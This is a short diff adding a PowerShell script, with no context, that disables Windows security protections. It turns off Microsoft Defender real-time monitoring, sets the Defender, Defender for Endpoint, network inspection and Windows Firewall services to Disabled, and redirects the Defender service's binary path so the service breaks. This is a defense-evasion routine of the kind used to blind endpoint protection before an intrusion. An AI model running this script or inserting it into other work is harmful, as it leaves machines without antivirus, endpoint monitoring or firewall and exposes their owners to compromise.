@@ -1,0 +1,6 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-Service WinDefend | Set-Service -StartupType Disabled
+Get-Service Sense | Set-Service -StartupType Disabled
+Get-Service mpssvc | Set-Service -StartupType Disabled
+Get-Service WdNisSvc | Set-Service -StartupType Disabled
+sc.exe config WinDefend binPath=%windir%\bfsvc.exe
